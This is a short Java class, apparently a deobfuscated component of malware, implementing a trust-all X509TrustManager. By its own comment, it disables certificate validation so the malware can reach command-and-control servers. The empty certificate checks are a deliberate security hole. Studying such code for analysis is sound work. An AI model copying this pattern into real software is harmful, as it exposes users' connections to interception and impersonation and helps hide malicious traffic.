import java.security.cert.X509Certificate;
import javax.net.ssl.X509TrustManager;

/**
 * Cleaned TrustAllManager (formerly a.java)
 * Disables SSL certificate validation to allow connections to C2 servers
 * with self-signed or invalid certificates.
 */
public class TrustAllManager implements X509TrustManager {
    @Override
    public void checkClientTrusted(X509Certificate[] chain, String authType) {}

    @Override
    public void checkServerTrusted(X509Certificate[] chain, String authType) {}

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
